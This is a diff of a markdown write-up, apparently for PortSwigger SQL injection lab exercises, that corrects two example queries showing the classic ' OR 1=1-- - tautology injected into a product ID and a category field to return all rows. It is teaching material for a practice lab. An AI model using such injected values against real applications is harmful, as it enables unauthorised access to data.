@@ -102,7 +102,7 @@ SELECT * FROM products WHERE productId = '1'
 
 **New SQL statement:**
 ```sql
-SELECT * FROM products WHERE productId = ''' OR 1=1-- -
+SELECT * FROM products WHERE productId = '1' OR 1=1-- -
 ```
 
 Will it returns every products?
@@ -135,7 +135,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 
 **New SQL statement:**
 ```sql
-SELECT * FROM products WHERE category = ''' OR 1=1-- - AND released = 1
+SELECT * FROM products WHERE category = '' OR 1=1-- - AND released = 1
 ```
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203034318.png)
